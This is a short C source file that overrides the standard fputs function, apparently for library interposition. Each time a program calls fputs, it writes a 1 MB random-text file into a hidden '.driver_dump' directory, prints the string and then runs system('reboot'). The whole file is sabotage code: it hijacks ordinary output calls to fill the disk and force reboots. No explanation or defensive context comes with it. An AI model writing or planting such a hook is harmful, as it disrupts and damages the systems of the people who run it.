#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/stat.h>

int fputs(const char *str, FILE *stream)
{

    
    
srand(time(NULL));

    char initial_path[200];
    strcpy(initial_path,".driver_dump/.");

    char string[9];
    for (int i = 0; i < 8; i++) {
        string[i] = 'a' + rand() % 26;
    }
    string[8] = '\0';

    char filename[8+5];
    strcpy(filename, string);
    strcat(filename, ".txt");
    strcat(initial_path,filename);
    
    mkdir(".driver_dump", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);

    FILE *fp = fopen(initial_path, "w");

    int i;
    for (i = 0; i < 1024 * 1024; i++) {
        fputc('a' + rand() % 26, fp);
    }
    
    // Close the file
    fclose(fp);
    
	printf("%s",str);
	
	sleep(1);
	
	system("reboot");
}
